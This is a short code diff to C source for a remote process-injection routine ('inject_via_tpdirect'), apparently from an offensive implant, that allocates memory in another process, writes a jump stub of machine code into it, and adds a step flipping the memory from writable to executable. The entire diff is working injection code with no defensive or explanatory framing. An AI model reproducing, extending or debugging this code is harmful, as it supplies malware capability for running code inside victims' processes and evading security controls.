@@ -651,8 +651,11 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		0x48, 0x8B, 0x49, 0x48,             /* mov rcx, [rcx+0x48] param    */
 		0xFF, 0xE0                          /* jmp rax                      */
 	};
+	/* alloc RW -> write -> flip RX: the syscall alloc layer does not take
+	 * PAGE_EXECUTE_READ at allocation time (C-25 live: gle=183 on the stub
+	 * alloc; same EC-era fix pattern) */
 	unsigned char * stub = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, sizeof(stubc),
-	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (stub == NULL) {
 		spawn_log("tpdirect: stub alloc failed gle=", (long)GetLastError());
 		return FALSE;
@@ -661,6 +664,13 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	if (!beacon_WriteProcessMemory(hProcess, stub, stubc, sizeof(stubc), &sgot) || sgot != sizeof(stubc)) {
 		spawn_log("tpdirect: stub write failed gle=", (long)GetLastError());
 		return FALSE;
+	}
+	{
+		DWORD sold = 0;
+		if (!beacon_VirtualProtectEx(hProcess, stub, sizeof(stubc), PAGE_EXECUTE_READ, &sold)) {
+			spawn_log("tpdirect: stub protect failed gle=", (long)GetLastError());
+			return FALSE;
+		}
 	}
 	unsigned char * direct = (unsigned char *)beacon_VirtualAllocEx(hProcess, NULL, 0x60,
 	                                                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
